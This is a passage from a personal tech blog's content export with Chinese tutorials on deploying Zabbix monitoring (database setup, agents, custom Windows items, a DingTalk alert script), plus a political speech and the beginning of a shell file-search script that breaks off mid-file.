<h4 id="2）安装设置数据库："><a href="#2）安装设置数据库：" class="headerlink" title="2）安装设置数据库："></a>2）安装设置数据库：</h4><p>1、安装 mariadb-server mariadb</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@zabbix-server ~]# yum -y install  mariadb mariadb-server</span><br></pre></td></tr></table></figure>

<p>2、重启我们的数据库服务：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@zabbix-server ~]# systemctl restart mariadb</span><br><span class="line">[root@zabbix-server ~]# systemctl enable mariadb</span><br><span class="line">[root@zabbix-server ~]# mysqladmin -u root password 'zabbix'    #设置root密码</span><br></pre></td></tr></table></figure>

<p>3、创建数据库并授权账号</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@zabbix-server ~]# mysql -uroot -p'zabbix'</span><br><span class="line">MariaDB [(none)]&gt; create database zabbix character set utf8 collate utf8_bin;  # 创建zabbix数据库</span><br><span class="line">MariaDB [(none)]&gt; grant all privileges on zabbix.* to zabbix@localhost identified by 'zabbix';										# 注意授权网段</span><br><span class="line">MariaDB [(none)]&gt; flush privileges;           # 刷新授权</span><br><span class="line">MariaDB [(none)]&gt; \q   #退出</span><br><span class="line">Bye</span><br></pre></td></tr></table></figure>

<p>4、<strong>导入表</strong></p>
<p>　我们直接把表导入至我们的数据库即可：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@zabbix-server ~]# zcat /usr/share/doc/zabbix-server-mysql*/create.sql.gz | mysql -uzabbix -p zabbix</span><br><span class="line">Enter password:                   #输入密码</span><br></pre></td></tr></table></figure>

<p>　　导入以后，我们进去数据库查看一下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@zabbix-server zabbix-server-mysql-3.4.15]# mysql -uzabbix -p</span><br><span class="line">Enter password: </span><br><span class="line">MariaDB [(none)]&gt; show databases;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| information_schema |</span><br><span class="line">| mysql              |</span><br><span class="line">| performance_schema |</span><br><span class="line">| test               |</span><br><span class="line">| zabbix             |</span><br><span class="line">+--------------------+</span><br><span class="line">MariaDB [(none)]&gt; use zabbix;</span><br><span class="line">Database changed</span><br><span class="line">MariaDB [zabbix]&gt; show tables;</span><br><span class="line">+----------------------------+</span><br><span class="line">| Tables_in_zabbix           |</span><br><span class="line">+----------------------------+</span><br><span class="line">| acknowledges               |</span><br><span class="line">| actions                    |</span><br><span class="line">.....</span><br><span class="line">| proxy_dhistory             |</span><br><span class="line">| proxy_history              |</span><br><span class="line">| regexps                    |</span><br><span class="line">| rights                     |</span><br><span class="line">| screen_user                |</span><br><span class="line">+----------------------------+</span><br><span class="line">140 rows in set (0.001 sec)</span><br></pre></td></tr></table></figure>

<p>可以看出来，我们的数据已经导入成功了。</p>
<h3 id="3、配置-server-端"><a href="#3、配置-server-端" class="headerlink" title="3、配置 server 端"></a>3、配置 server 端</h3><p>　　我们的数据库准备好了以后，我们要去修改server端的配置文件。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@zabbix-server ~]# cd /etc/zabbix/</span><br><span class="line">[root@zabbix-server zabbix]# ls</span><br><span class="line">web  zabbix_agentd.conf  zabbix_agentd.d  zabbix_server.conf</span><br><span class="line"><span class="meta">#</span><span class="bash">为了方便我们以后恢复，我们把配置文件备份一下</span></span><br><span class="line">[root@zabbix-server zabbix]# cp zabbix_server.conf zabbix_server.conf.bak</span><br><span class="line">[root@zabbix-server zabbix]# vim zabbix_server.conf</span><br><span class="line"> DBHost=localhost      #数据库对外的主机</span><br><span class="line"> DBName=zabbix               #数据库名称</span><br><span class="line"> DBUser=zabbix              #数据库用户</span><br><span class="line"> DBPassword=zabbix             #数据库密码</span><br><span class="line"><span class="meta"> #</span><span class="bash">这里的配置文件打开后：如果有的就不用添加了。如果是注释了的也不用取消注释。直接把内容复制粘贴过去就可以 了。</span></span><br></pre></td></tr></table></figure>

<p>　　以上，我们的基本配置已经完成，可以开启服务了：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@zabbix-server zabbix]# systemctl start zabbix-server</span><br><span class="line">[root@zabbix-server zabbix]# systemctl enable zabbix-server</span><br><span class="line">Created symlink from /etc/systemd/system/multi-user.target.wants/zabbix-server.service to /usr/lib/systemd/system/zabbix-server.service.</span><br></pre></td></tr></table></figure>

<p>　　开启服务以后，我们一定要去确认一下我们的端口有没有开启：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@zabbix-server zabbix]# netstat -lntp | grep 10051</span><br><span class="line">tcp        0      0 0.0.0.0:10051           0.0.0.0:*               LISTEN      1574/zabbix_server  </span><br><span class="line">tcp6       0      0 :::10051                :::*                    LISTEN      1574/zabbix_server</span><br></pre></td></tr></table></figure>

<p>　　如果查到的端口没有开启，我们就要去检查一下配置文件有没有出问题了。</p>
<h3 id="4、配置-web-GUI"><a href="#4、配置-web-GUI" class="headerlink" title="4、配置 web GUI"></a>4、配置 web GUI</h3><p>　　有一个<code>/etc/httpd/conf.d/zabbix.conf</code>文件，这个配置文件就是帮我们做映射的文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@zabbix-server zabbix]# vim /etc/httpd/conf.d/zabbix.conf   #设置时区</span><br><span class="line"><span class="meta">#</span><span class="bash">里面基本不用动。只需要添加一行时区即可</span></span><br><span class="line">php_value date.timezone Asia/Shanghai       ---添加如下</span><br></pre></td></tr></table></figure>

<p><img src= "/img/loading.gif" data-src="/2020/09/10/zabbix-server%E9%83%A8%E7%BD%B2/image-20200910160452201.png" alt="image-20200910160452201"></p>
<p>接下来，我们就可以启动我们的<code>httpd</code>服务了：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@zabbix-server zabbix]# systemctl start httpd</span><br><span class="line">[root@zabbix-server zabbix]# systemctl enable httpd</span><br><span class="line">Created symlink from /etc/systemd/system/multi-user.target.wants/httpd.service to /usr/lib/systemd/system/httpd.service.</span><br></pre></td></tr></table></figure>

<p><img src= "/img/loading.gif" data-src="/2020/09/10/zabbix-server%E9%83%A8%E7%BD%B2/1564673383779.png" alt="1564673383779"></p>
<p>我们的服务已经开启，接着我们就可以用浏览器来访问了。</p>
<h3 id="5、浏览器访问并进行初始化设置"><a href="#5、浏览器访问并进行初始化设置" class="headerlink" title="5、浏览器访问并进行初始化设置"></a>5、浏览器访问并进行初始化设置</h3><p>　　我们使用浏览器访问<code>192.168.246.228/zabbix</code>，第一次访问时需要进行一些初始化的设置，我们按照提示操作即可：<br><img src= "/img/loading.gif" data-src="/2020/09/10/zabbix-server%E9%83%A8%E7%BD%B2/1564673465051.png" alt="1564673465051"><br><img src= "/img/loading.gif" data-src="/2020/09/10/zabbix-server%E9%83%A8%E7%BD%B2/1564673502910.png" alt="1564673502910"><br><img src= "/img/loading.gif" data-src="/2020/09/10/zabbix-server%E9%83%A8%E7%BD%B2/1564673589463.png" alt="1564673589463"></p>
<p><img src= "/img/loading.gif" data-src="/2020/09/10/zabbix-server%E9%83%A8%E7%BD%B2/1564673701285.png" alt="1564673701285"><br><img src= "/img/loading.gif" data-src="/2020/09/10/zabbix-server%E9%83%A8%E7%BD%B2/1564673742484.png" alt="1564673742484"><br><img src= "/img/loading.gif" data-src="/2020/09/10/zabbix-server%E9%83%A8%E7%BD%B2/1564673764878.png" alt="1564673764878"><br>　　点击Finish以后，我们就会跳转到登录页面，使用我们的账号密码登录即可：<br><img src= "/img/loading.gif" data-src="/2020/09/10/zabbix-server%E9%83%A8%E7%BD%B2/1564673857972.png" alt="1564673857972"><br>　　默认用户名为：Admin ，密码为：zabbix 。<br>　　登陆进来就可以看到我们的仪表盘了：<br><img src= "/img/loading.gif" data-src="/2020/09/10/zabbix-server%E9%83%A8%E7%BD%B2/1564673915441.png" alt="1564673915441"></p>
<h3 id="6、配置-agent-端"><a href="#6、配置-agent-端" class="headerlink" title="6、配置 agent 端"></a>6、配置 agent 端</h3><p>　　当我们把监控端配置启动以后，我们需要来设置一下我们的被监控端，我们在被监控的主机安装好agent，设置好他的server，并把他添加到server端，就能将其纳入我们的监控系统中去了。</p>
<h4 id="1）安装-zabbix"><a href="#1）安装-zabbix" class="headerlink" title="1）安装 zabbix"></a>1）安装 zabbix</h4><p>　　同样的，我们先来安装zabbix。两台机器都操作</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@zabbix-agent-none1 ~]# rpm -ivh http://repo.zabbix.com/zabbix/3.4/rhel/7/x86_64/zabbix-release-3.4-2.el7.noarch.rpm</span><br><span class="line">[root@zabbix-agent-none1 ~]# yum install zabbix-agent zabbix-sender -y</span><br></pre></td></tr></table></figure>

<p>　　安装完成以后，我们去修改配置文件。</p>
<h4 id="2）修改配置文件"><a href="#2）修改配置文件" class="headerlink" title="2）修改配置文件"></a>2）修改配置文件</h4><p>　　对配置文件做一个备份，然后去修改配置文件：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@zabbix-agent-none1 ~]# cd /etc/zabbix/</span><br><span class="line">[root@zabbix-agent-none1 zabbix]# ls</span><br><span class="line">zabbix_agentd.conf  zabbix_agentd.d</span><br><span class="line">[root@zabbix-agent-none1 zabbix]# cp zabbix_agentd.conf&#123;,.bak&#125;</span><br><span class="line">[root@zabbix-agent-none1 zabbix]# ls</span><br><span class="line">zabbix_agentd.conf  zabbix_agentd.conf.bak  zabbix_agentd.d</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@zabbix-agent-none1 zabbix]# vim zabbix_agentd.conf   ----修改如下</span><br><span class="line">Server=192.168.246.228 zabbix服务器的地址 </span><br><span class="line">ServerActive=192.168.246.228 主动模式 zabbix-server-ip </span><br><span class="line">Hostname=zabbix-agent-none1 </span><br><span class="line">UnsafeUserParameters=1 是否限制用户自定义 keys 使用特殊字符 1是可以启用特殊字符 0是不可以启用特殊字符</span><br><span class="line">EnableRemoteCommands=0 是否允许别人执行远程操作命令，默认是禁用的，打开的话会有安全风险.</span><br></pre></td></tr></table></figure>

<p><img src= "/img/loading.gif" data-src="/2020/09/10/zabbix-server%E9%83%A8%E7%BD%B2/1204916-20171202111819198-1483932137.png" alt="img"></p>
<p>是否允许别人执行远程操作命令，默认是禁用的，打开的话会有安全风险.</p>
<p>　　修改完成之后，我们保存退出。然后就可以启动服务了：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@zabbix-agent-none1 zabbix]# systemctl start zabbix-agent</span><br><span class="line">[root@zabbix-agent-none1 zabbix]# systemctl enable zabbix-agent</span><br></pre></td></tr></table></figure>

<p>　　照例查看端口是否已开启</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@zabbix-agent-none1 zabbix]# netstat -lntp | grep 10050</span><br><span class="line">tcp        0      0 0.0.0.0:10050           0.0.0.0:*               LISTEN      9369/zabbix_agentd  </span><br><span class="line">tcp6       0      0 :::10050                :::*                    LISTEN      9369/zabbix_agentd</span><br></pre></td></tr></table></figure>

<p>　　已经开启成功。接着，我们就可以去server端添加了。<br>　　none2也进行同样的操作，唯一不同的就是配置文件中的<code>Hostname</code>要设为<code>zabbix-agent-none2</code>。</p>
]]></content>
      <categories>
        <category>zabbix</category>
      </categories>
      <tags>
        <tag>zabbix</tag>
      </tags>
  </entry>
  <entry>
    <title>zabbix使用自定义监控项监控windows</title>
    <url>/2020/09/10/zabbix%E4%BD%BF%E7%94%A8%E8%87%AA%E5%AE%9A%E4%B9%89%E7%9B%91%E6%8E%A7%E9%A1%B9%E7%9B%91%E6%8E%A7windows/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="zabbix使用自定义监控项监控windows"><a href="#zabbix使用自定义监控项监控windows" class="headerlink" title="zabbix使用自定义监控项监控windows"></a>zabbix使用自定义监控项监控windows</h1><p>监控windows主机时使用Template OS Windows模板监控项中只有CPU的1、5、15分钟的负载而没有CPU使用率，所以如果想监控windows主机的CPU使用率就要自己定义监控项，如下：</p>
<p><img src= "/img/loading.gif" data-src="/2020/09/10/zabbix%E4%BD%BF%E7%94%A8%E8%87%AA%E5%AE%9A%E4%B9%89%E7%9B%91%E6%8E%A7%E9%A1%B9%E7%9B%91%E6%8E%A7windows/image-20200910135621077.png" alt="image-20200910135621077"></p>
<h2 id="windows客户端配置"><a href="#windows客户端配置" class="headerlink" title="windows客户端配置"></a>windows客户端配置</h2><p>windows下的配置文件zabbix_agentd.conf添加以下文字</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">PerfCounter=UserPerfCountercpu,"\Processor(_Total)\ % Processor Time",30</span><br></pre></td></tr></table></figure>

<p>监控其他的资源在CMD里面输入typeperf -qx&gt;c:\zabbix.txt，打开C盘下的zabbix.txt文件，里面即是可监控的资源，自己再新增键值，添加windows下的配置文件zabbix_agentd.conf即可！</p>
<h4 id="重启客户端的zabbix服务"><a href="#重启客户端的zabbix服务" class="headerlink" title="重启客户端的zabbix服务"></a>重启客户端的zabbix服务</h4><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="function">E:\<span class="title">zabbix</span>\<span class="title">zabbix_agentd.exe</span> -<span class="title">x</span> -<span class="title">c</span> <span class="title">E</span>:\<span class="title">zabbix</span>\<span class="title">zabbix_agentd.conf</span>  关闭</span></span><br><span class="line"><span class="function"><span class="title">E</span>:\<span class="title">zabbix</span>\<span class="title">zabbix_agentd.exe</span> -<span class="title">s</span> -<span class="title">c</span> <span class="title">E</span>:\<span class="title">zabbix</span>\<span class="title">zabbix_agentd.conf</span>  启动</span></span><br></pre></td></tr></table></figure>

<h2 id="web端配置"><a href="#web端配置" class="headerlink" title="web端配置"></a>web端配置</h2><ul>
<li>修改模板<br>configuration–Templates–Template OS Windows–Items–Create item</li>
</ul>
<table>
<thead>
<tr>
<th><strong>Name</strong></th>
<th><strong>Value</strong></th>
</tr>
</thead>
<tbody><tr>
<td>name(名称)</td>
<td>UserPerfCountercpu</td>
</tr>
<tr>
<td>key(键值)</td>
<td>UserPerfCountercpu</td>
</tr>
<tr>
<td>Type of information(数据类型)</td>
<td>Numeric(float)数字的（浮点）</td>
</tr>
<tr>
<td>Units(单位)</td>
<td>%</td>
</tr>
<tr>
<td>Update interval(in sec)(数据更新间隔(秒))</td>
<td>30</td>
</tr>
<tr>
<td>Applications(应用集)</td>
<td>CPU</td>
</tr>
</tbody></table>
<p>配置好之后就会在链接了Template OS Windows模板的主机上看到这个自定义的监控项了。在Monitoring——Latest data——右上角选择Group、Host，在CPU集中有。<br> 如果没有找到，请在configuration——hosts——找到对应主机的Items,查看是否有次监控项并且监控项的最后一列显示的是绿色状态，如果是红色，说明对应主机上的zabbix客户端配置文件中没有定义这个监控项。</p>
<h4 id="自定义监控项规则"><a href="#自定义监控项规则" class="headerlink" title="自定义监控项规则"></a>自定义监控项规则</h4><p>zabbix的windows客户端里的配置文件中是这样写的：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">## Option: UserParameter</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash">   User-defined parameter to monitor. There can be several user-defined parameters.</span></span><br><span class="line"><span class="meta">#</span><span class="bash">   Format: UserParameter=&lt;key&gt;,&lt;shell <span class="built_in">command</span>&gt;</span></span><br><span class="line"><span class="meta">#</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Mandatory: no</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Default:</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> UserParameter=</span></span><br></pre></td></tr></table></figure>

<p>意思就是你可以设置一个用户自定义的监控项。</p>
<p><strong>格式：</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Format: UserParameter=&lt;key&gt;,&lt;shell command&gt;</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th><strong>名词</strong></th>
<th><strong>解释</strong></th>
</tr>
</thead>
<tbody><tr>
<td>UserParameter</td>
<td>固定格式</td>
</tr>
<tr>
<td>key</td>
<td>新建Item中第三行的key的名称，也可创建可接受参数的key,如下例1</td>
</tr>
<tr>
<td>shell command</td>
<td>获取信息的命令</td>
</tr>
</tbody></table>
<p><strong>例1：查询内存使用情况</strong><br> UserParameter=Memusage[*],cat /proc/meminfo | awk ‘/^$1/{print $$2}’<br> key为Memusage，且能够接受一个参数；<br> 由于$1，$2等要用于UserParameter的参数调用，awk中的$2之前要多用一个$符；<br> 在server测试时，其调用的key可以为Memusage[MemFree]，Memusage[MemTotal]等；</p>
<p>获取nginx的状态信息，活动连接数</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">UserParameter=ngx.active[*],curl -s http://$1:$2/$3 | awk '/^Active/&#123;print $$3&#125;'</span><br></pre></td></tr></table></figure>

<p>获取nginx的状态信息，已接受的请求数量</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">UserParameter=ngx.accepts[*],curl -s http://$1:$2/$3 | awk '/^[[:space:]]*[0-9]/&#123;print $$1&#125;'</span><br></pre></td></tr></table></figure>

<p>获取nginx的状态信息，总请求数量</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">UserParameter=ngx.requests[*],curl -s http://$1:$2/$3 | awk '/^[[:space:]]*[0-9]/&#123;print $$3&#125;'</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>zabbix</category>
      </categories>
      <tags>
        <tag>windows</tag>
        <tag>zabbix</tag>
      </tags>
  </entry>
  <entry>
    <title>zabbix钉钉报警设置</title>
    <url>/2020/09/11/zabbix%E9%92%89%E9%92%89%E6%8A%A5%E8%AD%A6%E8%AE%BE%E7%BD%AE/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="zabbix钉钉报警设置"><a href="#zabbix钉钉报警设置" class="headerlink" title="zabbix钉钉报警设置"></a>zabbix钉钉报警设置</h1><p>首先需要下载PC端的钉钉，在想要进行报警通知的群里依次进行如下操作</p>
<p><img src= "/img/loading.gif" data-src="/2020/09/11/zabbix%E9%92%89%E9%92%89%E6%8A%A5%E8%AD%A6%E8%AE%BE%E7%BD%AE/image-20200911091513525.png" alt="image-20200911091513525"></p>
<p><img src= "/img/loading.gif" data-src="/2020/09/11/zabbix%E9%92%89%E9%92%89%E6%8A%A5%E8%AD%A6%E8%AE%BE%E7%BD%AE/image-20200911091809458.png" alt="image-20200911091809458"></p>
<p><img src= "/img/loading.gif" data-src="/2020/09/11/zabbix%E9%92%89%E9%92%89%E6%8A%A5%E8%AD%A6%E8%AE%BE%E7%BD%AE/image-20200911091836434.png" alt="image-20200911091836434"></p>
<p><img src= "/img/loading.gif" data-src="/2020/09/11/zabbix%E9%92%89%E9%92%89%E6%8A%A5%E8%AD%A6%E8%AE%BE%E7%BD%AE/image-20200911104815442.png" alt="image-20200911104815442"></p>
<p><img src= "/img/loading.gif" data-src="/2020/09/11/zabbix%E9%92%89%E9%92%89%E6%8A%A5%E8%AD%A6%E8%AE%BE%E7%BD%AE/image-20200911104843877.png" alt="image-20200911104843877"></p>
<p><img src= "/img/loading.gif" data-src="/2020/09/11/zabbix%E9%92%89%E9%92%89%E6%8A%A5%E8%AD%A6%E8%AE%BE%E7%BD%AE/image-20200911104908433.png" alt="image-20200911104908433"></p>
<p>然后填写对应的信息即可</p>
<p><img src= "/img/loading.gif" data-src="/2020/09/11/zabbix%E9%92%89%E9%92%89%E6%8A%A5%E8%AD%A6%E8%AE%BE%E7%BD%AE/image-20200911104945992.png" alt="image-20200911104945992"></p>
<p>把webhook的地址记录下来</p>
<p>创建脚本，赋予执行权限</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[root@zabbix-server ~]<span class="comment"># cd /usr/lib/zabbix/alertscripts</span></span><br><span class="line">[root@zabbix-server alertscripts]<span class="comment"># vim dingding.py</span></span><br><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"> </span><br><span class="line">headers = &#123;<span class="string">'Content-Type'</span>: <span class="string">'application/json;charset=utf-8'</span>&#125;</span><br><span class="line">api_url = <span class="string">""</span>  <span class="comment">#机器人的Webhook地址</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">msg</span><span class="params">(text)</span>:</span></span><br><span class="line">    json_text= &#123;</span><br><span class="line">     <span class="string">"msgtype"</span>: <span class="string">"text"</span>,</span><br><span class="line">        <span class="string">"text"</span>: &#123;</span><br><span class="line">            <span class="string">"content"</span>: text</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">"at"</span>: &#123;</span><br><span class="line">            <span class="string">"atMobiles"</span>: [</span><br><span class="line">                <span class="string">""</span>    <span class="comment">#手机号</span></span><br><span class="line">            ],</span><br><span class="line">            <span class="string">"isAtAll"</span>: <span class="literal">False</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">print</span> requests.post(api_url,json.dumps(json_text),headers=headers).content</span><br><span class="line">     </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    text = sys.argv[<span class="number">1</span>]</span><br><span class="line">    msg(text)</span><br><span class="line">[root@zabbix-server alertscripts]<span class="comment"># chmod +x dingding.py</span></span><br></pre></td></tr></table></figure>

<p>安装python-pip和requests库</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@zabbix-server alertscripts]# yum -y install epel-release</span><br><span class="line">[root@zabbix-server alertscripts]# yum -y install python-pip</span><br><span class="line">[root@zabbix-server alertscripts]# pip install requests</span><br></pre></td></tr></table></figure>

<p><img src= "/img/loading.gif" data-src="/2020/09/11/zabbix%E9%92%89%E9%92%89%E6%8A%A5%E8%AD%A6%E8%AE%BE%E7%BD%AE/image-20200911105958541.png" alt="image-20200911105958541"></p>
<p>测试脚本是否可行</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@zabbix-server alertscripts]# ./dingding.py 监控报警测试</span><br><span class="line">&#123;"errcode":0,"errmsg":"ok"&#125;</span><br></pre></td></tr></table></figure>

<p>PC端接收成功</p>
<p><img src= "/img/loading.gif" data-src="/2020/09/11/zabbix%E9%92%89%E9%92%89%E6%8A%A5%E8%AD%A6%E8%AE%BE%E7%BD%AE/image-20200911110324327.png" alt="image-20200911110324327"></p>
<p>移动端也接收成功</p>
<p><img src= "/img/loading.gif" data-src="/2020/09/11/zabbix%E9%92%89%E9%92%89%E6%8A%A5%E8%AD%A6%E8%AE%BE%E7%BD%AE/a2bda4d0821335d756af5ddad32a635.jpg" alt="a2bda4d0821335d756af5ddad32a635"></p>
<p>在监控页面创建媒介：</p>
<p><img src= "/img/loading.gif" data-src="/2020/09/11/zabbix%E9%92%89%E9%92%89%E6%8A%A5%E8%AD%A6%E8%AE%BE%E7%BD%AE/1588073617418.png" alt="1588073617418"></p>
<p><img src= "/img/loading.gif" data-src="/2020/09/11/zabbix%E9%92%89%E9%92%89%E6%8A%A5%E8%AD%A6%E8%AE%BE%E7%BD%AE/image-20200911114605626.png" alt="image-20200911114605626"></p>
<p>将Admin用户关联到此媒介：</p>
<p><img src= "/img/loading.gif" data-src="/2020/09/11/zabbix%E9%92%89%E9%92%89%E6%8A%A5%E8%AD%A6%E8%AE%BE%E7%BD%AE/1588073727897.png" alt="1588073727897"></p>
<p><img src= "/img/loading.gif" data-src="/2020/09/11/zabbix%E9%92%89%E9%92%89%E6%8A%A5%E8%AD%A6%E8%AE%BE%E7%BD%AE/1588073739694.png" alt="1588073739694"></p>
<p><img src= "/img/loading.gif" data-src="/2020/09/11/zabbix%E9%92%89%E9%92%89%E6%8A%A5%E8%AD%A6%E8%AE%BE%E7%BD%AE/1588073811456.png" alt="1588073811456"></p>
]]></content>
      <categories>
        <category>zabbix</category>
      </categories>
      <tags>
        <tag>zabbix</tag>
      </tags>
  </entry>
  <entry>
    <title>“不忘初心，牢记使命”主题演讲比赛演讲稿</title>
    <url>/2018/06/03/%E2%80%9C%E4%B8%8D%E5%BF%98%E5%88%9D%E5%BF%83%EF%BC%8C%E7%89%A2%E8%AE%B0%E4%BD%BF%E5%91%BD%E2%80%9D%E4%B8%BB%E9%A2%98%E6%BC%94%E8%AE%B2%E6%AF%94%E8%B5%9B%E6%BC%94%E8%AE%B2%E7%A8%BF/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="“不忘初心，牢记使命”主题演讲比赛演讲稿"><a href="#“不忘初心，牢记使命”主题演讲比赛演讲稿" class="headerlink" title="“不忘初心，牢记使命”主题演讲比赛演讲稿"></a>“不忘初心，牢记使命”主题演讲比赛演讲稿</h1><p><img src= "/img/loading.gif" data-src="/2018/06/03/%E2%80%9C%E4%B8%8D%E5%BF%98%E5%88%9D%E5%BF%83%EF%BC%8C%E7%89%A2%E8%AE%B0%E4%BD%BF%E5%91%BD%E2%80%9D%E4%B8%BB%E9%A2%98%E6%BC%94%E8%AE%B2%E6%AF%94%E8%B5%9B%E6%BC%94%E8%AE%B2%E7%A8%BF/image-20200817172242793.png" alt="image-20200817172242793"></p>
<p>高举新时代中国特色社会主义伟大旗帜，决胜全面建成小康社会，夺取新时代中国特色社会主义伟大胜利，为实现中华民族伟大复兴的中国梦，不懈奋斗。回想起，习近平总书记在十九大报告中，高瞻远瞩，举旗定向。我不仅心潮激荡，情绪昂扬，站在演讲台上，追忆起从十八大到十九大五年来的时光。</p>
<p>五年的时间有多长?它能让一个青年高中毕业，戴上党章。五年的时间有多长？它能让一个城市跃居一线，气清天朗。五年的时间有多长？它能让一个国家奔向复兴，决胜小康。五年的时间有多长？它能让一个世界，共同命运，和美久长。离别故乡，戴上党章，青年追随时代不断成长，越据一线，气清天朗，奔向复兴，决胜小康。国家凝心聚力，实现梦想。共同命运，和美久长。世界倾听华夏，强音回响。追随时代，不断成长，青年在六大原则中汲取营养。</p>
<p>城市用五位一体续写辉煌，凝心聚力，实现梦想。国家心怀四个自信，以诗和远方为朝向。倾听华夏，强音回响，是四个意识在星辰大海，汇成的改革乐章。梁启超的诗句，就在青年的耳畔，音乐铿锵。既然征途是星辰大海，我们就必须深刻领会习近平新时代中国特色社会主义思想，既然选择了诗和远方，我们就始终走在新长征的路上。思想有多深邃，只有在实践中体会。征途有多漫长，只有用脚步去丈量。也许丈量，只是跬步却因不舍而行至千里。也许体会，只有点滴却可以由涓流汇成汪洋。</p>
<p>有位必须有为，担责才算担当。心存敬畏，敬业爱岗，为的是不负众望。那就请把希望，寄托在我们青年的肩上。不忘初心，牢记使命。砥砺前行，方得始终，愿与各位同志，共建美好未来。大家多尽一份心，多出一把力，再发一次热，再放一缕光。撸起袖子加油干，好风凭借力，扬帆再起航。</p>
]]></content>
      <categories>
        <category>生活</category>
      </categories>
      <tags>
        <tag>生活</tag>
      </tags>
  </entry>
  <entry>
    <title>【Shell练习】Linux下的everything</title>
    <url>/2019/08/22/%E3%80%90Shell%E7%BB%83%E4%B9%A0%E3%80%91Linux%E4%B8%8B%E7%9A%84everything/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>想试一下自己写脚本的能力，大家都知道在windows有一个搜索工具叫everything，今天我写一个在Linux下可以使用的everything</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line"></span><br><span class="line">function helpu &#123;</span><br><span class="line">    echo " "</span><br><span class="line">    echo "Fuzzy search for filename."</span><br><span class="line">    echo "$0 [--match-case|--path] filename"</span><br><span class="line">    echo " "</span><br><span class="line">    exit</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># set variables</span></span></span><br><span class="line">MATCH="-iname"</span><br><span class="line">SEARCH="."</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># parse options</span></span></span><br><span class="line">while [ True ]; do</span><br><span class="line">if [ "$1" = "--help" -o "$1" = "-h" ]; then</span><br><span class="line">    helpu</span><br><span class="line">elif [ "$1" = "--match-case" -o "$1" = "-m" ]; then</span><br><span class="line">    MATCH="-name"</span><br><span class="line">    shift 1</span><br><span class="line">elif [ "$1" = "--path" -o "$1" = "-p" ]; then</span><br><span class="line">    SEARCH="$&#123;2&#125;"</span><br><span class="line">    shift 2</span><br><span class="line">else</span><br><span class="line">    break</span><br><span class="line">fi</span><br><span class="line">done</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># sanitize input filenames</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># create array, retain spaces</span></span></span><br><span class="line">ARG=( "$&#123;@&#125;" ) </span><br><span class="line">set -e</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># catch obvious input error</span></span></span><br><span class="line">if [ "X$ARG" = "X" ]; then</span><br><span class="line">    helpu</span><br><span class="line">fi</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># perform search</span></span></span><br><span 